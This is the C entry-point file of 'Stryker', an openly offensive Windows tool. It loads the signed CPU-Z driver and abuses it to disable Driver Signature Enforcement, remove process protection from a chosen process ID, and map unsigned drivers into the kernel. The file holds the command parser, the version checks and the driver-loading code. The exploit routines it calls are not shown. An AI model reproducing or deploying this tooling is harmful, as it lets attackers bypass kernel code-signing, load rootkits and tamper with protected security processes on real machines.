/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.00
*
*  DATE:        10 Feb 2018
*
*  Codename: Maya AL
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#pragma data_seg("shrd")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()
#pragma comment(linker, "/Section:shrd,RWS")

HANDLE  g_hDevice = INVALID_HANDLE_VALUE;
ULONG   g_NtBuildNumber = 0;

#define T_STRYKERINTRO   TEXT("Stryker v1.0.0 started (c) 2018 Stryker Project\r\nSupported x64 OS : 7 (6.1 build 7600) and above\r\n")
#define T_STRYKERUNSUP   TEXT("\r\n[!] Unsupported WinNT version\r\n")
#define T_STRYKERRUN     TEXT("\r\n[!] Another instance running, close it before\r\n")
#define T_STRYKERINVCMD  TEXT("\r\n[!] Invalid command or parameters\r\n")

#define T_STRYKERUSAGE   TEXT("\r\nUsage: stryker Mode [Command]\r\n\n\
Parameters: \r\n\
Stryker -dse off        - disable Driver Signature Enforcement\r\n\
Stryker -dse on         - enable Driver Signature Enforcement\r\n\
Stryker -prot pid       - disable ProtectedProcess for given pid\r\n\
Stryker -load filename  - map your specially created driver\r\n")

#define CMDS_MAX 3
#define CMDS_INVALID 4
PCWSTR CMDS[] = { TEXT("-dse"), TEXT("-prot"), TEXT("-load") };

BOOL LoadAndOpenDrvInternal()
{
    WCHAR szBuffer[MAX_PATH * 2];

    supPrintText(TEXT("\r\n[+] Loading CPU-Z driver..."));

    _strcpy(szBuffer, NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath.Buffer);
    _strcat(szBuffer, CPUZDRV);
    _strcat(szBuffer, TEXT(".sys"));

    if (!RtlDoesFileExists_U(szBuffer)) {
        supPrintText(TEXT("\r\n[!] Driver file not found in the current directory"));
        return FALSE;
    }

    if (!scmOpenDevice(CPUZDRV, &g_hDevice)) {
        if (!scmLoadDeviceDriver(CPUZDRV, szBuffer, &g_hDevice)) {
            supShowError(GetLastError(), TEXT("Cannot load driver"));
            return FALSE;
        }
        else {
            supPrintText(TEXT("\r\n[+] CPU-Z driver loaded"));
        }
    }
    return (g_hDevice != INVALID_HANDLE_VALUE);
}

BOOL LoadAndOpenDrv()
{
    LoadAndOpenDrvInternal();
    if (g_hDevice == INVALID_HANDLE_VALUE) {
        supPrintText(TEXT("\r\n[!] Cannot open CPU-Z device"));
        return FALSE;
    }
    else {
        supPrintText(TEXT("\r\n[+] CPU-Z device opened"));
        return TRUE;
    }
}

BOOL ParseCommandLine()
{
    BOOL EnableDSE = FALSE;
    ULONG Length;
    LPWSTR CommandLine = GetCommandLineW();
    WCHAR szCmdBuffer[MAX_PATH * 2];

    UINT i, c = CMDS_INVALID;

    ULONG_PTR ProcessId;

    RtlSecureZeroMemory(szCmdBuffer, sizeof(szCmdBuffer));
    if (!GetCommandLineParam(CommandLine, 1, szCmdBuffer, MAX_PATH, &Length)) {
        supPrintText(T_STRYKERUSAGE);
        return FALSE;
    }

    if (Length == 0) {
        supPrintText(T_STRYKERUSAGE);
        return FALSE;
    }

    for (i = 0; i < CMDS_MAX; i++) {
        if (_strcmpi(szCmdBuffer, CMDS[i]) == 0) {
            c = i;
            break;
        }
    }

    if (c == CMDS_INVALID) {
        supPrintText(T_STRYKERINVCMD);
        return FALSE;
    }

    // query 2nd parameter
    RtlSecureZeroMemory(szCmdBuffer, sizeof(szCmdBuffer));
    if (!GetCommandLineParam(CommandLine, 2, szCmdBuffer, MAX_PATH, &Length)) {
        supPrintText(T_STRYKERINVCMD);
        return FALSE;
    }

    if (Length == 0) {
        supPrintText(T_STRYKERINVCMD);
        return FALSE;
    }

    switch (c) {

    case 0: // dse

        if (_strcmpi(szCmdBuffer, TEXT("on")) == 0) {
            EnableDSE = TRUE;
        }
        else {
            if (_strcmpi(szCmdBuffer, TEXT("off")) == 0)
                EnableDSE = FALSE;
            else {
                supPrintText(T_STRYKERINVCMD);
                break;
            }
        }

        supPrintText(TEXT("\r\n[+] DSE Control Mode"));

        if (!LoadAndOpenDrv())
            return FALSE;

        return ControlDSE(EnableDSE);
        break;

    case 1: // prot

        if ((g_NtBuildNumber < 9600) || (g_NtBuildNumber > 16299)) {
            supPrintText(T_STRYKERUNSUP);
            break;
        }

        ProcessId = strtou64(szCmdBuffer);
        if (ProcessId == 0) {
            supPrintText(T_STRYKERINVCMD);
            break;
        }

        supPrintText(TEXT("\r\n[+] Process Control Mode"));

        if (!LoadAndOpenDrv())
            return FALSE;

        return ControlProcess(ProcessId);
        break;

    case 2: // load

        supPrintText(TEXT("\r\n[+] Driver Mapping Mode"));

        if (!LoadAndOpenDrv())
            return FALSE;

        return MapDriver(szCmdBuffer);
        break;

    default:
        break;
    }

    return FALSE;
}

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
void main()
{
    BOOL            bCond = FALSE;
    LONG            x;
    OSVERSIONINFO   osv;
    WCHAR           szBuffer[MAX_PATH * 2];

    do {
        supPrintText(T_STRYKERINTRO);
        x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
        if (x > 1) {
            supPrintText(T_STRYKERRUN);
            break;
        }

        RtlSecureZeroMemory(&osv, sizeof(osv));
        osv.dwOSVersionInfoSize = sizeof(osv);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
        if ((osv.dwBuildNumber < 7600) || (osv.dwBuildNumber > 16299)) {
            supPrintText(T_STRYKERUNSUP);
            break;
        }   

        g_NtBuildNumber = osv.dwBuildNumber;

        _strcpy(szBuffer, TEXT("Current Windows version: "));
        ultostr(osv.dwMajorVersion, _strend(szBuffer));
        _strcat(szBuffer, TEXT("."));
        ultostr(osv.dwMinorVersion, _strend(szBuffer));
        _strcat(szBuffer, TEXT(" build "));
        ultostr(osv.dwBuildNumber, _strend(szBuffer));
        supPrintText(szBuffer);

        if (!ParseCommandLine())
           break;

    } while (bCond);

    if (g_hDevice != INVALID_HANDLE_VALUE) {
        supPrintText(TEXT("\r\n[+] Unloading CPU-Z driver"));
        CloseHandle(g_hDevice);
        scmUnloadDeviceDriver(CPUZDRV);
        supPrintText(TEXT("\r\n[+] Exit"));
    }

    InterlockedDecrement((PLONG)&g_lApplicationInstances);
    ExitProcess(0);
}
